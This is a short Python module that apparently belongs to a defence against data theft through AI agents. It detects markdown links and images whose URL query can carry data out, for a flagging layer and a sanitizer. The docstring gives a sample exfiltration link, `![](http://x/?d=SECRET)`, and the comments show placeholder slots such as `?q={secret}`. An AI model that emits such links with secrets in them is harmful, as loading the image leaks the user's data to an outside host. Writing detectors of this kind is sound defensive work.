"""Markdown links and images that can carry data out in their URL.

An agent that renders `![](http://x/?d=SECRET)` leaks the secret the moment the image loads. Shared
by L2, which flags these links, and the sanitizer, which defangs them.
"""

import re
from collections.abc import Iterator
from urllib.parse import parse_qsl, urlsplit

MARKDOWN_LINK = re.compile(r"!?\[[^\]\n]{0,200}\]\(([^()\s]{1,2000})[^()\n]{0,200}\)")
DATA_VALUE_LENGTH = 16
# A value left for the agent to fill in, such as `?d=CONTENTS` or `?q={secret}`.
PLACEHOLDER_VALUE = re.compile(r"[A-Z][A-Z0-9_]{3,}|\{.*\}|<.*>|\[.*\]|\$\w+")


def has_data_value(url: str) -> bool:
    try:
        parts = urlsplit(url)
        values = [value for _, value in parse_qsl(parts.query, keep_blank_values=True)]
    except ValueError:
        return False
    if parts.scheme not in ("http", "https"):
        return False
    return any(
        len(value) >= DATA_VALUE_LENGTH or PLACEHOLDER_VALUE.fullmatch(value) for value in values
    )


def exfil_links(text: str) -> Iterator[re.Match[str]]:
    """Each markdown link or image whose URL carries data or a slot for it."""
    for match in MARKDOWN_LINK.finditer(text):
        if has_data_value(match.group(1)):
            yield match
